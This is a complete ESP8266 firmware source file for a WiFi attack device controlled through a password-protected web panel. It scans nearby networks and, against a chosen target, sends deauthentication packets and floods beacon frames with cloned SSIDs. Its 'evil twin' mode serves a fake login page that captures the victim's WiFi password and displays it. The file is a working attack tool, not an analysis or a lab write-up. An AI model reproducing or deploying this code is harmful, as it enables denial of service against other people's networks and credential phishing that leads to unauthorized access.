#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>

extern "C" {
#include "user_interface.h"
}

// Configuration - Change these values
const char* ap_ssid = "SecurityScanPanel";  // Change this to your preferred SSID
const char* ap_password = "S3cur3P@ssw0rd!";  // Strong password (12+ chars, mix of upper/lower/numbers/symbols)

AsyncWebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[20];
_Network _selectedNetwork;
int totalNetworks = 0;
bool deauthing_active = false;
bool beaconActive = false;
bool evilTwinActive = false;
String capturedPassword = "";
unsigned long now = 0;
unsigned long deauth_now = 0;
unsigned long beacon_now = 0;
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
String selectedSSID = "";
uint8_t selectedBSSID[6];
int selectedChannel = 1;
int beaconCounter = 0;
String fakeSSIDs[100];

void clearArray() {
  for (int i = 0; i < 20; i++) {
    _Network _network;
    _networks[i] = _network;
  }
  totalNetworks = 0;
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void generateFakeSSIDs() {
  for (int i = 0; i < 100; i++) {
    fakeSSIDs[i] = "Free_WiFi_" + String(i);
    if (selectedSSID != "") {
      fakeSSIDs[i] = selectedSSID + "_Clone_" + String(i);
    }
  }
}

void performScan() {
  WiFi.mode(WIFI_AP_STA);
  int n = WiFi.scanNetworks();
  WiFi.mode(WIFI_AP);
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 20; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[totalNetworks++] = network;
    }
  }
}

String getStatusHTML() {
  String html = "<div style='margin:20px 0;padding:10px;border:1px solid #ddd;'>";
  html += "<h3>Current Status</h3>";
  html += "<p><strong>Deauth Attack:</strong> " + String(deauthing_active ? "ACTIVE" : "INACTIVE") + "</p>";
  html += "<p><strong>Beacon Flood:</strong> " + String(beaconActive ? "ACTIVE" : "INACTIVE") + "</p>";
  html += "<p><strong>Evil Twin:</strong> " + String(evilTwinActive ? "ACTIVE" : "INACTIVE") + "</p>";
  if (capturedPassword != "") {
    html += "<p style='color:red;'><strong>Captured Password:</strong> " + capturedPassword + "</p>";
  }
  html += "</div>";
  return html;
}

String generateHTML() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body {font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5;}";
  html += ".container {max-width:800px;margin:0 auto;background:#fff;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}";
  html += "h1 {color:#333;text-align:center;}";
  html += "table {width:100%;border-collapse:collapse;margin:20px 0;}";
  html += "th,td {border:1px solid #ddd;padding:8px;text-align:left;}";
  html += "th {background-color:#f2f2f2;}";
  html += "button {background-color:#4CAF50;color:white;border:none;padding:8px 16px;text-align:center;text-decoration:none;display:inline-block;font-size:14px;margin:4px 2px;cursor:pointer;border-radius:4px;}";
  html += ".stop-btn {background-color:#f44336;}";
  html += ".selected {background-color:#90EE90;}";
  html += "</style></head><body><div class='container'>";
  html += "<h1>WiFi Security Panel</h1>";
  
  html += getStatusHTML();
  
  html += "<div style='margin-bottom:20px;'>";
  html += "<form style='display:inline;' method='get' action='/deauth'>";
  html += "<button type='submit' name='action' value='" + String(deauthing_active ? "stop" : "start") + "' class='" + String(deauthing_active ? "stop-btn" : "") + "'>";
  html += deauthing_active ? "Stop Deauth" : "Start Deauth";
  html += "</button></form>";
  
  html += "<form style='display:inline;margin-left:10px;' method='get' action='/beacon'>";
  html += "<button type='submit' name='action' value='" + String(beaconActive ? "stop" : "start") + "' class='" + String(beaconActive ? "stop-btn" : "") + "'>";
  html += beaconActive ? "Stop Beacon Flood" : "Start Beacon Flood";
  html += "</button></form>";
  
  html += "<form style='display:inline;margin-left:10px;' method='get' action='/eviltwin'>";
  html += "<button type='submit' name='action' value='" + String(evilTwinActive ? "stop" : "start") + "' class='" + String(evilTwinActive ? "stop-btn" : "") + "'>";
  html += evilTwinActive ? "Stop Evil Twin" : "Start Evil Twin";
  html += "</button></form>";
  html += "</div>";
  
  html += "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
  
  for (int i = 0; i < totalNetworks; ++i) {
    if (_networks[i].ssid == "") continue;
    bool isSelected = (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6));
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td>";
    html += "<td><form method='get' action='/select'><input type='hidden' name='ap' value='" + bytesToStr(_networks[i].bssid, 6) + "'>";
    html += "<button type='submit' class='" + String(isSelected ? "selected" : "") + "'>";
    html += isSelected ? "Selected" : "Select";
    html += "</button></form></td></tr>";
  }
  
  html += "</table></div></body></html>";
  return html;
}

void handleRoot(AsyncWebServerRequest *request) {
  if (!request->authenticate("admin", ap_password)) {
    return request->requestAuthentication();
  }
  request->send(200, "text/html", generateHTML());
}

void handleSelect(AsyncWebServerRequest *request) {
  if (!request->authenticate("admin", ap_password)) {
    return request->requestAuthentication();
  }
  if (request->hasArg("ap")) {
    for (int i = 0; i < totalNetworks; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == request->arg("ap")) {
        _selectedNetwork = _networks[i];
        selectedSSID = _networks[i].ssid;
        selectedChannel = _networks[i].ch;
        memcpy(selectedBSSID, _networks[i].bssid, 6);
        generateFakeSSIDs();
        break;
      }
    }
  }
  request->redirect("/");
}

void handleDeauth(AsyncWebServerRequest *request) {
  if (!request->authenticate("admin", ap_password)) {
    return request->requestAuthentication();
  }
  if (request->hasArg("action")) {
    deauthing_active = (request->arg("action") == "start");
  }
  request->redirect("/");
}

void handleBeacon(AsyncWebServerRequest *request) {
  if (!request->authenticate("admin", ap_password)) {
    return request->requestAuthentication();
  }
  if (request->hasArg("action")) {
    beaconActive = (request->arg("action") == "start");
    if (beaconActive) {
      generateFakeSSIDs();
    }
  }
  request->redirect("/");
}

void handleEvilTwin(AsyncWebServerRequest *request) {
  if (!request->authenticate("admin", ap_password)) {
    return request->requestAuthentication();
  }
  if (request->hasArg("action")) {
    evilTwinActive = (request->arg("action") == "start");
  }
  request->redirect("/");
}

void handleCapture(AsyncWebServerRequest *request) {
  if (request->hasArg("password")) {
    capturedPassword = request->arg("password");
    Serial.println("Captured password: " + capturedPassword);
  }
  request->send(200, "text/plain", "OK");
}

void sendDeauthPacket() {
  if (!deauthing_active || selectedSSID == "") return;
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    selectedBSSID[0], selectedBSSID[1], selectedBSSID[2], selectedBSSID[3], selectedBSSID[4], selectedBSSID[5],
    selectedBSSID[0], selectedBSSID[1], selectedBSSID[2], selectedBSSID[3], selectedBSSID[4], selectedBSSID[5],
    0x00, 0x00,
    0x01, 0x00
  };
  
  wifi_set_channel(selectedChannel);
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  delay(1);
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void sendBeaconPacket() {
  if (!beaconActive) return;

  String currentFakeSSID = fakeSSIDs[beaconCounter % 100];
  beaconCounter++;
  
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01, 0x04
  };

  int ssidLen = currentFakeSSID.length();
  beaconPacket[40] = ssidLen;
  memcpy(&beaconPacket[41], currentFakeSSID.c_str(), ssidLen);
  
  wifi_set_channel(random(1, 12));
  wifi_send_pkt_freedom(beaconPacket, 50 + ssidLen, 0);
}

void setup() {
  Serial.begin(115200);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);
  
  dnsServer.start(53, "*", apIP);
  wifi_promiscuous_enable(1);
  
  performScan();
  generateFakeSSIDs();

  server.on("/", HTTP_GET, handleRoot);
  server.on("/select", HTTP_GET, handleSelect);
  server.on("/deauth", HTTP_GET, handleDeauth);
  server.on("/beacon", HTTP_GET, handleBeacon);
  server.on("/eviltwin", HTTP_GET, handleEvilTwin);
  server.on("/capture", HTTP_GET, handleCapture);
  
  server.onNotFound([](AsyncWebServerRequest *request) {
    if (evilTwinActive) {
      request->send(200, "text/html", "<html><body><h1>Login Required</h1><form action='/capture' method='get'><input type='password' name='password' placeholder='WiFi Password'><button type='submit'>Connect</button></form></body></html>");
    } else {
      request->send(404, "text/plain", "Not found");
    }
  });
  
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  
  unsigned long currentMillis = millis();
  
  if (deauthing_active && currentMillis - deauth_now >= 100) {
    sendDeauthPacket();
    deauth_now = currentMillis;
  }
  
  if (beaconActive && currentMillis - beacon_now >= 100) {
    sendBeaconPacket();
    beacon_now = currentMillis;
  }
  
  if (currentMillis - now >= 15000) {
    performScan();
    now = currentMillis;
  }
  
  if (evilTwinActive) {
    dnsServer.processNextRequest();
  }
}